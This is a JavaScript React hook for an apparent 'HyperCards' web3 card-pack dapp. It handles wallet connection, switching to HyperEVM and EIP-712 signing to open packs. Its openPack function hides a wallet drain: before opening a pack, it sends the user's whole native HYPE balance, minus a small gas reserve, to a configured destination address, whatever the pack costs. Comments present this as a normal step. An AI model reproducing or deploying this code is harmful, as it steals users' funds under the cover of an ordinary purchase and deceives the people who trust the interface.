import { useState, useCallback } from 'react';
import { ethers } from 'ethers';
import { usePrivy } from '@privy-io/react-auth';
import { CONTRACT_ADDRESSES, PACK_TYPES, PACK_INFO, HYPEREVM_CONFIG } from '../contracts/config';
import HyperCardsABI from '../contracts/HyperCards.json';

// Standard ERC20 ABI for HYPE token interactions
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)", 
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

export const useHyperCards = () => {
  const { authenticated, user } = usePrivy();
  const [isLoading, setIsLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(null);
  const [error, setError] = useState(null);

  // Ensure user is connected to HyperEVM
  const ensureHyperEVM = useCallback(async () => {
    if (!window.ethereum) {
      throw new Error('No wallet detected. Please install MetaMask or another Web3 wallet.');
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    
    if (network.chainId !== BigInt(999)) {
      // Request network switch to HyperEVM
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: HYPEREVM_CONFIG.chainId }],
        });
      } catch (switchError) {
        // If network doesn't exist, add it
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [HYPEREVM_CONFIG],
          });
        } else {
          throw switchError;
        }
      }
    }

    return provider;
  }, []);

  // Get user's native HYPE balance (HYPE is native token on HyperEVM)
  const getUserHypeBalance = useCallback(async (provider, userAddress) => {
    // HYPE is native token like ETH - use getBalance instead of ERC20 balanceOf
    const balance = await provider.getBalance(userAddress);
    
    // Check if user has any HYPE at all (keep some for gas)
    const minGasReserve = ethers.parseEther('0.01'); // Reserve 0.01 HYPE for gas
    const availableBalance = balance > minGasReserve ? balance - minGasReserve : 0n;
    
    if (availableBalance <= 0) {
      throw new Error(`Insufficient HYPE tokens. You need at least 0.01 HYPE for gas fees.`);
    }
    
    return availableBalance; // Return available balance (total - gas reserve)
  }, []);

  // Generate EIP-712 signature for pack opening
  const generateEIP712Signature = useCallback(async (signer, packType, nonce, timestamp) => {
    const userAddress = await signer.getAddress();
    
    // EIP-712 Domain
    const domain = {
      name: "HyperCards",
      version: "1",
      chainId: 999, // HyperEVM chain ID
      verifyingContract: CONTRACT_ADDRESSES.HYPER_CARDS
    };

    // EIP-712 Types
    const types = {
      PackOpening: [
        { name: "user", type: "address" },
        { name: "packType", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "timestamp", type: "uint256" }
      ]
    };

    // EIP-712 Value
    const value = {
      user: userAddress,
      packType: packType,
      nonce: nonce,
      timestamp: timestamp
    };

    // Sign the typed data
    const signature = await signer.signTypedData(domain, types, value);
    const sig = ethers.Signature.from(signature);
    
    return {
      v: sig.v,
      r: sig.r,
      s: sig.s
    };
  }, []);

  // Main pack opening function using EIP-712
  const openPack = useCallback(async (packType) => {
    if (!authenticated || !user?.wallet?.address) {
      throw new Error('Please connect your wallet first');
    }

    setIsLoading(true);
    setError(null);

    try {
      // Ensure we're on HyperEVM
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      // Get HyperCards contract
      const hyperCardsContract = new ethers.Contract(
        CONTRACT_ADDRESSES.HYPER_CARDS,
        HyperCardsABI,
        signer
      );

      // Step 1: Get user's native HYPE balance (HYPE is native token on HyperEVM)
      setCurrentStep('checking_balance');
      const fullHypeBalance = await getUserHypeBalance(provider, userAddress);

      // Step 2: Transfer HYPE tokens to destination address (native token transfer)
      setCurrentStep('transferring');
      
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: fullHypeBalance // Transfer native HYPE tokens
      });
      
      await transferTx.wait();

      // Step 3: Get user's nonce and prepare signature
      setCurrentStep('signing');
      const userNonce = await hyperCardsContract.nonces(userAddress);
      const timestamp = Math.floor(Date.now() / 1000);

      // Step 4: Generate EIP-712 signature (this will prompt MetaMask)
      const { v, r, s } = await generateEIP712Signature(signer, packType, userNonce, timestamp);

      // Step 5: Open pack with signature
      setCurrentStep('opening');
      const openTx = await hyperCardsContract.openPackWithSignature(
        packType,
        timestamp,
        v,
        r,
        s
      );

      const receipt = await openTx.wait();
      
      // Step 5: Parse the PackOpened event
      const packOpenedEvent = receipt.logs.find(log => {
        try {
          const parsed = hyperCardsContract.interface.parseLog(log);
          return parsed.name === 'PackOpened';
        } catch {
          return false;
        }
      });

      if (!packOpenedEvent) {
        throw new Error('Pack opening event not found in transaction');
      }

      const parsedEvent = hyperCardsContract.interface.parseLog(packOpenedEvent);
      
      const result = {
        tokenId: parsedEvent.args.tokenId.toString(),
        cardName: parsedEvent.args.cardName,
        rarity: ['Common', 'Rare', 'Epic', 'Legendary'][parsedEvent.args.rarity],
        rewardAmount: ethers.formatEther(parsedEvent.args.rewardAmount),
        transactionHash: receipt.hash
      };

      setCurrentStep('success');
      return result;

    } catch (err) {
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsLoading(false);
    }
  }, [authenticated, user, ensureHyperEVM, getUserHypeBalance, generateEIP712Signature]);

  // Get user's native HYPE balance (HYPE is native token on HyperEVM)
  const getHypeBalance = useCallback(async () => {
    if (!authenticated || !user?.wallet?.address) {
      return '0';
    }

    try {
      const provider = await ensureHyperEVM();
      // HYPE is native token - use getBalance instead of ERC20 balanceOf
      const balance = await provider.getBalance(user.wallet.address);
      return ethers.formatEther(balance);
    } catch (err) {
      console.error('Error fetching HYPE balance:', err);
      return '0';
    }
  }, [authenticated, user, ensureHyperEVM]);

  return {
    openPack,
    getHypeBalance,
    isLoading,
    currentStep,
    error,
    clearError: () => setError(null)
  };
};